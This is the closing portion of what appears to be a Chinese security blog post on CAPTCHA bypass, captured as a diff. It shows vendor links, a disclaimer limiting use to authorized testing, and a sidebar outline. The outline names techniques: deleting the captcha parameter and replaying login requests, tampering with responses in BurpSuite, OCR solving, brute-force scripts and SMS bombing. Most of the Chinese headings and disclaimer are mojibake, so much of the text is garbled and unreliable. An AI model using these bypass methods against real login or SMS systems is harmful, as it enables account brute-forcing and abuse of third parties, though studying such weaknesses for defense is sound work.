+<h3 id="楠岃瘉鐮佷骇鍝"><a href="#楠岃瘉鐮佷骇鍝" class="headerlink" title="楠岃瘉鐮佷骇鍝?"></a>楠岃瘉鐮佷骇鍝?</h3><ul>
+<li><a target="_blank" rel="noopener" href="https://www.geetest.com/">鏋侀獙 Geetest</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.aliyun.com/product/security/captcha">闃块噷浜?Captcha</a></li>
+<li><a target="_blank" rel="noopener" href="https://cloud.tencent.com/product/captcha">鑵捐浜?Captcha</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.dingxiang-inc.com/">椤惰薄 Dingxiang</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.google.com/recaptcha/">Google reCAPTCHA</a></li>
+</ul>
+<hr>
+<blockquote>
+<p><strong>鍏嶈矗澹版槑</strong>锛氭湰鏂囨。浠呬緵瀹夊叏闃插尽鍜屾巿鏉冩祴璇曞弬鑰冦€傛墍鏈夋紡娲炰俊鎭潎鏉ヨ嚜鍏紑娓犻亾锛岃鍕跨敤浜庢湭鎺堟潈鐨勬祴璇曟垨鏀诲嚮琛屼负銆備娇鐢ㄨ€呭簲閬靛畧褰撳湴娉曞緥娉曡锛屽悗鏋滆嚜璐熴€?&gt;<br><strong>鏍稿績鍘熷垯</strong>锛氶獙璇佺爜鍙槸涓€绉嶅噺缂撴墜娈碉紝涓嶈兘浣滀负鍞竴鐨勫畨鍏ㄩ槻绾裤€傜湡姝ｇ殑瀹夊叏闇€瑕侀€氳繃澶氱淮搴﹂鎺т綋绯诲疄鐜般€?&gt;<br><strong>鐢熸垚鏃堕棿</strong>锛?026-07-08</p>
+</blockquote>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/Web%E5%AE%89%E5%85%A8/" rel="tag"># Web安全</a>
+              <a href="/tags/%E7%BB%95%E8%BF%87/" rel="tag"># 绕过</a>
+              <a href="/tags/%E9%AA%8C%E8%AF%81%E7%A0%81/" rel="tag"># 验证码</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2024/03/21/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" rel="prev" title="汇编语言学习笔记">
+      <i class="fa fa-chevron-left"></i> 汇编语言学习笔记
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2026/07/09/%E5%8D%9A%E8%BE%BECMS%20API%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/" rel="next" title="博达CMS API未授权访问分析">
+      博达CMS API未授权访问分析 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%A5%A0%E5%B2%83%E7%98%89%E9%90%AE%E4%BD%BA%E7%B2%AB%E6%9D%A9%E5%9B%A8%E7%B4%A1%E5%A8%B2%E7%82%B4%E5%A6%A7%E9%8F%88%EE%88%9B%E5%AF%9A%E9%8D%97"><span class="nav-number">1.</span> <span class="nav-text">楠岃瘉鐮佺粫杩囨紡娲炴妧鏈寚鍗?</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%90%A9%EE%86%BC%E7%B6%8D"><span class="nav-number">1.1.</span> <span class="nav-text">鐩綍</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%B6%93%E2%82%AC%E9%8A%86%E4%BE%80%E7%8D%99%E7%92%87%E4%BD%BA%E7%88%9C%E5%A7%92%E5%82%9D%E5%A0%AA%E6%B6%93%E5%BA%A1%E5%9E%8E%E7%BB%AB"><span class="nav-number">1.2.</span> <span class="nav-text">涓€銆侀獙璇佺爜姒傝堪涓庡垎绫?</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-1-%E6%B5%A0%E2%82%AC%E6%B6%94%E5%A0%9F%E6%A7%B8%E6%A5%A0%E5%B2%83%E7%98%89%E9%90%AE"><span class="nav-number">1.2.1.</span> <span class="nav-text">1.1 浠€涔堟槸楠岃瘉鐮?</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-2-%E6%A5%A0%E5%B2%83%E7%98%89%E9%90%AE%E4%BD%B8%E5%9E%8E%E7%BB%AB"><span class="nav-number">1.2.2.</span> <span class="nav-text">1.2 楠岃瘉鐮佸垎绫?</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-3-%E7%94%AF%E6%AD%8C%EE%9D%86%E6%A5%A0%E5%B2%83%E7%98%89%E9%90%AE%E4%BD%B7%E9%AA%87%E9%8D%9D"><span class="nav-number">1.2.3.</span> <span class="nav-text">1.3 甯歌楠岃瘉鐮佷骇鍝?</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%B5%9C%E5%B1%BB%E2%82%AC%E4%BE%80%E7%8D%99%E7%92%87%E4%BD%BA%E7%88%9C%E5%A9%95%E5%BF%94%E7%A4%8A%E9%8D%8F%E3%84%A6%E6%AB%99"><span class="nav-number">1.3.</span> <span class="nav-text">浜屻€侀獙璇佺爜婕忔礊鍏ㄦ櫙</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#2-1-%E5%A9%95%E5%BF%94%E7%A4%8A%E9%8D%92%E5%97%99%E8%A2%AB%E9%90%AD%E2%95%85%E6%A8%80"><span class="nav-number">1.3.1.</span> <span class="nav-text">2.1 婕忔礊鍒嗙被鐭╅樀</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E9%90%A9%E5%AD%98%E5%B8%B4%E9%8E%B6%E6%92%B3%E5%AF%98%E9%94%9B%E5%B1%BD%E5%9E%B9%E9%97%84%E3%82%89%E7%8D%99%E7%92%87%E4%BD%BA%E7%88%9C%E9%8D%99%E5%82%9B%E6%9A%9F%E9%94%9B%E5%B2%84%E5%99%B8%E9%8F%80%E6%83%A7%E5%B5%86%E9%8D%99-POST-login-HTTP-1-1"><span class="nav-number">2.</span> <span class="nav-text">鐩存帴鎶撳寘锛屽垹闄ら獙璇佺爜鍙傛暟锛岄噸鏀惧嵆鍙?POST &#x2F;login HTTP&#x2F;1.1</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E9%8E%B4%E6%A0%AB%E6%B4%BF%E9%8E%BA%E3%83%A5%E5%9E%B9%E9%97%84-captcha-%E9%8D%99%E5%82%9B%E6%9A%9F"><span class="nav-number">3.</span> <span class="nav-text">鎴栫洿鎺ュ垹闄?captcha 鍙傛暟</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%8D%92%E2%95%83%E6%95%A4%E9%8F%82%E7%91%B0%E7%B4%A1%E9%94%9B%E6%B0%AB%E5%A8%87%E9%90%A2-BurpSuite-%E9%90%A8-Intercept-Server-Response-%E9%8D%94%E7%86%BB%E5%85%98%E9%94%9B%E5%B1%BE%E5%AB%A4%E9%8E%B4%EE%81%84%E6%90%B7%E6%90%B4%E6%96%BF%E8%8B%9F%E6%B7%87%EE%86%BD%E6%95%BC%E9%8A%86"><span class="nav-number">3.1.</span> <span class="nav-text">鍒╃敤鏂瑰紡锛氫娇鐢?BurpSuite 鐨?Intercept Server Response 鍔熻兘锛屾嫤鎴搷搴斿苟淇敼銆?</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%8D%A5%E6%B6%96%E2%82%AC%E4%BE%80%E2%82%AC%E6%98%8F%E7%B7%AB%E7%BC%82%E6%B4%AA%E6%AB%A1%E7%BC%81%E6%9B%A1%E7%B9%83"><span class="nav-number">3.2.</span> <span class="nav-text">鍥涖€侀€昏緫缂洪櫡缁曡繃</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#4-1-%E6%A5%A0%E5%B2%83%E7%98%89%E9%90%AE%E4%BD%B9%E6%B9%AD%E9%8F%8D%EF%BF%A0%E7%8D%99"><span class="nav-number">3.2.1.</span> <span class="nav-text">4.1 楠岃瘉鐮佹湭鏍￠獙</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-4-%E6%A5%A0%E5%B2%83%E7%98%89%E9%90%AE%E4%BD%B9%E6%B9%AD%E7%BC%81%E6%88%9D%E7%95%BE%E6%B5%BC%E6%B0%B3%E7%98%BD"><span class="nav-number">3.2.2.</span> <span class="nav-text">4.4 楠岃瘉鐮佹湭缁戝畾浼氳瘽</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-5-%E6%A5%A0%E5%B2%83%E7%98%89%E9%90%AE%E4%BD%B9%E6%B9%AD%E7%BC%81%E6%88%9D%E7%95%BE%E9%8E%BF%E5%B6%84%E7%B6%94"><span class="nav-number">3.2.3.</span> <span class="nav-text">4.5 楠岃瘉鐮佹湭缁戝畾鎿嶄綔</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-6-%E6%A5%A0%E5%B2%83%E7%98%89%E9%90%AE%E4%BD%BD%E7%B9%83%E9%8F%88%E7%86%B8%E6%A4%82%E9%97%82%E7%A3%8B%E7%B9%83%E9%97%80"><span class="nav-number">3.2.4.</span> <span class="nav-text">4.6 楠岃瘉鐮佽繃鏈熸椂闂磋繃闀?</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-7-%E6%A5%A0%E5%B2%83%E7%98%89%E9%90%AE%E4%BD%B8%E6%B4%96%E9%8F%84"><span class="nav-number">3.2.5.</span> <span class="nav-text">4.7 楠岃瘉鐮佸洖鏄?</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-9-%E9%90%AD%EE%85%9D%E4%BF%8A%E6%9D%9E%E6%89%AE%E5%81%A2"><span class="nav-number">3.2.6.</span> <span class="nav-text">4.9 鐭俊杞扮偢</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%A6%AB%E2%82%AC%E5%A8%B4%E5%AC%AB%E6%9F%9F%E5%A8%89-%E9%94%9B-1-%E7%80%B5%E7%91%B0%E6%82%93%E6%B6%93%E2%82%AC%E9%8E%B5%E5%AC%AB%E6%BA%80%E9%8D%99%E7%96%AF%E7%B9%9B%E7%BC%81%EE%85%9E%E5%BD%82%E9%96%AB-10-%E5%A8%86%E2%80%B2%E4%BA%92%E6%B6%93%E5%A9%87%E7%8D%99%E7%92%87%E4%BD%BA%E7%88%9C2-%E7%91%99%E5%82%9A%E7%99%82%E9%8F%84%EE%88%9A%E6%83%81%E6%9D%A9%E6%A8%BF%E5%85%98%E7%BC%81%D1%85%E7%94%BB%E9%8D%99%E6%88%A6%E2%82%AC-3-%E5%A6%AB%E2%82%AC%E9%8F%8C%E3%83%A6%E6%A7%B8%E9%8D%9A%EF%B8%BD%E6%B9%81%E6%A3%B0%E6%88%A0%E5%B7%BC%E9%97%84%E6%84%AC%E5%9F%97%E9%8E%B4%E6%A0%AC%EE%94%91%E6%B6%93%E6%B4%AA%E7%8D%99%E7%92%87"><span class="nav-number">3.3.</span> <span class="nav-text">**妫€娴嬫柟娉?*锛?1. 瀵瑰悓涓€鎵嬫満鍙疯繛缁彂閫?10 娆′互涓婇獙璇佺爜2. 瑙傚療鏄惁杩樿兘缁х画鍙戦€?3. 妫€鏌ユ槸鍚︽湁棰戠巼闄愬埗鎴栬涓洪獙璇?</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%B5%9C%E6%96%BB%E2%82%AC%E4%B8%B1CR-%E6%B6%93%E5%BA%A4%E5%9A%9C%E9%8D%94%E3%84%A5%E5%AF%B2%E7%92%87%E5%97%97%E5%9F%86%E7%BC%81%E6%9B%A1%E7%B9%83"><span class="nav-number">3.4.</span> <span class="nav-text">浜斻€丱CR 涓庤嚜鍔ㄥ寲璇嗗埆缁曡繃</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#5-1-Tesseract-OCR-%E7%92%87%E5%97%97%E5%9F%86"><span class="nav-number">3.4.1.</span> <span class="nav-text">5.1 Tesseract OCR 璇嗗埆</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%B5%A3%E8%B7%A8%E6%95%A4"><span class="nav-number">4.</span> <span class="nav-text">浣跨敤</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#5-3-%E5%A8%A3%E5%8D%9E%E5%AE%B3%E7%80%9B%EF%B8%BF%E7%AF%84%E5%A6%AF%E2%80%B3%E7%80%B7%E7%92%81%EE%85%A0%E7%B2%8C"><span class="nav-number">4.0.1.</span> <span class="nav-text">5.3 娣卞害瀛︿範妯″瀷璁粌</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-4-%E9%8E%B5%E6%92%B6%E7%88%9C%E9%AA%9E%E5%86%B2%E5%BD%B4%E9%8E%BA%E3%83%A5%E5%8F%86"><span class="nav-number">4.0.2.</span> <span class="nav-text">5.4 鎵撶爜骞冲彴鎺ュ叆</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%B5%A3%E8%B7%A8%E6%95%A4-1"><span class="nav-number">5.</span> <span class="nav-text">浣跨敤</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#6-2-reCAPTCHA-%E7%BC%81%E6%9B%A1%E7%B9%83"><span class="nav-number">5.0.1.</span> <span class="nav-text">6.2 reCAPTCHA 缁曡繃</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#6-3-%E6%A5%A0%E5%B2%83%E7%98%89%E9%90%AE-Token-%E5%A8%89%E5%8B%AF%E6%B9%B6"><span class="nav-number">5.0.2.</span> <span class="nav-text">6.3 楠岃瘉鐮?Token 娉勯湶</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#6-4-%E6%A5%A0%E5%B2%83%E7%98%89%E9%90%AE%E4%BD%B7%E7%AC%8C%E6%B6%93%E6%B0%AC%E5%A7%9F%E7%91%99h%E2%82%AC"><span class="nav-number">5.0.3.</span> <span class="nav-text">6.4 楠岃瘉鐮佷笌涓氬姟瑙ｈ€?</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%B6%93%E5%86%A6%E2%82%AC%E4%BD%B8%E4%BC%90%E9%8D%8F%E7%83%BD%E6%91%BC%E6%B6%93%E5%BA%A4%E5%9A%9C%E9%8D%94%E3%84%A5%E5%AF%B2%E9%91%B4%E6%B0%AD%E6%B9%B0"><span class="nav-number">5.1.</span> <span class="nav-text">涓冦€佸伐鍏烽摼涓庤嚜鍔ㄥ寲鑴氭湰</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#7-1-%E6%A5%A0%E5%B2%83%E7%98%89%E9%90%AE%E4%BD%B9%E5%A3%82%E9%8E%BB%E5%BF%93%E4%BC%90%E9%8D%8F"><span class="nav-number">5.1.1.</span> <span class="nav-text">7.1 楠岃瘉鐮佹壂鎻忓伐鍏?</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#7-2-ddddocr-%E8%B9%87%EE%82%A6%E2%82%AC%E7%86%BB%E7%98%91%E9%8D%92"><span class="nav-number">5.1.2.</span> <span class="nav-text">7.2 ddddocr 蹇€熻瘑鍒?</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#7-3-%E9%96%AB%E6%B0%B1%E6%95%A4%E6%A5%A0%E5%B2%83%E7%98%89%E9%90%AE%E4%BD%BA%E7%B2%AB%E6%9D%A9%E5%9B%AA%E5%9A%9C%E9%8D%94%E3%84%A5%E5%AF%B2%E9%91%B4%E6%B0%AD%E6%B9%B0"><span class="nav-number">5.1.3.</span> <span class="nav-text">7.3 閫氱敤楠岃瘉鐮佺粫杩囪嚜鍔ㄥ寲鑴氭湰</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#7-4-%E6%A5%A0%E5%B2%83%E7%98%89%E9%90%AE%E4%BD%B9%E5%A3%92%E9%96%B2%E5%BF%95%E5%9E%8E%E9%90%AE%E7%A3%8B%E5%89%BC%E9%8F%88"><span class="nav-number">5.1.4.</span> <span class="nav-text">7.4 楠岃瘉鐮佹壒閲忕垎鐮磋剼鏈?</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%8D%8F%EE%82%A0%E2%82%AC%E4%BE%80%E7%8D%99%E7%92%87%E4%BD%BA%E7%88%9C%E7%80%B9%E5%A4%8A%E5%8F%8F%E7%92%87%E5%8B%AA%E5%8F%8A-Checklist"><span class="nav-number">5.2.</span> <span class="nav-text">鍏€侀獙璇佺爜瀹夊叏璇勪及 Checklist</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#8-1-%E9%96%AB%E6%B0%B1%E6%95%A4%E5%A6%AB%E2%82%AC%E5%A8%B4%E5%AC%AB%E7%AB%BB%E9%8D%97"><span class="nav-number">5.2.1.</span> <span class="nav-text">8.1 閫氱敤妫€娴嬫竻鍗?</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#8-2-%E6%A5%A0%E5%B2%83%E7%98%89%E9%90%AE%E4%BD%B8%E5%B7%B1%E6%90%B4%EF%B9%81%E7%98%8E%E6%B5%BC%E6%8B%8C%E3%80%83"><span class="nav-number">5.2.2.</span> <span class="nav-text">8.2 楠岃瘉鐮佸己搴﹁瘎浼拌〃</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%B6%94%E6%BF%84%E2%82%AC%E4%BE%80%E6%A7%BB%E5%AF%B0%E2%80%B3%E7%BC%93%E7%92%81"><span class="nav-number">5.3.</span> <span class="nav-text">涔濄€侀槻寰″缓璁?</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%A6%83%E6%95%B6-P0-%E9%88%A5-%E8%B9%87%E5%91%B4%E3%80%8F%E6%B7%87%EE%86%BC%EE%98%B2"><span class="nav-number">5.3.1.</span> <span class="nav-text">馃敶 P0 鈥?蹇呴』淇</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%A6%83%E7%85%9B-P1-%E9%88%A5-%E7%81%8F%E8%97%89%E6%8F%A9%E6%B7%87%EE%86%BC%EE%98%B2"><span class="nav-number">5.3.2.</span> <span class="nav-text">馃煛 P1 鈥?灏藉揩淇</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%A6%83%E7%85%9D-P2-%E9%88%A5-%E5%AF%A4%E9%B8%BF%EE%86%85%E6%B5%BC%E6%A8%BA%E5%AF%B2"><span class="nav-number">5.3.3.</span> <span class="nav-text">馃煝 P2 鈥?寤鸿浼樺寲</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%8D%97%E4%BD%B5%E2%82%AC%E4%BD%B8%E5%BC%AC%E9%91%B0%E5%86%AE%E6%91%BC%E9%8E%BA"><span class="nav-number">5.4.</span> <span class="nav-text">鍗併€佸弬鑰冮摼鎺?</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%A9%95%E5%BF%94%E7%A4%8A%E9%8D%92%E5%97%98%E7%80%BD"><span class="nav-number">5.4.1.</span> <span class="nav-text">婕忔礊鍒嗘瀽</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AE%B8%E3%83%A5%E5%8F%BF%E6%B6%93%E5%BA%A1%E7%B4%91%E5%A9%A7%E6%84%B0%E3%80%8D%E9%90%A9"><span class="nav-number">5.4.2.</span> <span class="nav-text">宸ュ叿涓庡紑婧愰」鐩?</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%A5%A0%E5%B2%83%E7%98%89%E9%90%AE%E4%BD%B7%E9%AA%87%E9%8D%9D"><span class="nav-number">5.4.3.</span> <span class="nav-text">楠岃瘉鐮佷骇鍝?</span></a></li></ol></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Xioku"
+      src="/images/avatar.jpg">
+  <p class="site-author-name" itemprop="name">Xioku</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">13</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">5</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">26</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+        <div class="back-to-top motion-element">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; Fri Feb 02 2024 08:00:00 GMT+0800 (中国标准时间) – 
+  <span itemprop="copyrightYear">2026</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Xioku</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a>
+  </div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="Total Visitors">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="Total Views">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  
+  <script color='0,0,255' opacity='0.5' zIndex='-1' count='99' src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/shizuku.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true},"react":{"opacity":0.7},"dialog":{"enable":true,"hitokoto":true},"log":false});</script></body>
+</html>
+<script type="text/javascript" >
+!function(e,t,a){function n(){c(".heart{width: 10px;height: 10px;position: fixed;background: #f00;transform: rotate(45deg);-webkit-transform: rotate(45deg);-moz-transform: rotate(45deg);}.heart:after,.heart:before{content: '';width: inherit;height: inherit;background: inherit;border-radius: 50%;-webkit-border-radius: 50%;-moz-border-radius: 50%;position: fixed;}.heart:after{top: -5px;}.heart:before{left: -5px;}"),o(),r()}function r(){for(var e=0;e<d.length;e++)d[e].alpha<=0?(t.body.removeChild(d[e].el),d.splice(e,1)):(d[e].y--,d[e].scale+=.004,d[e].alpha-=.013,d[e].el.style.cssText="left:"+d[e].x+"px;top:"+d[e].y+"px;opacity:"+d[e].alpha+";transform:scale("+d[e].scale+","+d[e].scale+") rotate(45deg);background:"+d[e].color+";z-index:99999");requestAnimationFrame(r)}function o(){var t="function"==typeof e.onclick&&e.onclick;e.onclick=function(e){t&&t(),i(e)}}function i(e){var a=t.createElement("div");a.className="heart",d.push({el:a,x:e.clientX-5,y:e.clientY-5,scale:1,alpha:1,color:s()}),t.body.appendChild(a)}function c(e){var a=t.createElement("style");a.type="text/css";try{a.appendChild(t.createTextNode(e))}catch(t){a.styleSheet.cssText=e}t.getElementsByTagName("head")[0].appendChild(a)}function s(){return"rgb("+~~(255*Math.random())+","+~~(255*Math.random())+","+~~(255*Math.random())+")"}var d=[];e.requestAnimationFrame=function(){return e.requestAnimationFrame||e.webkitRequestAnimationFrame||e.mozRequestAnimationFrame||e.oRequestAnimationFrame||e.msRequestAnimationFrame||function(e){setTimeout(e,1e3/60)}}(),n()}(window,document);
+</script>
+
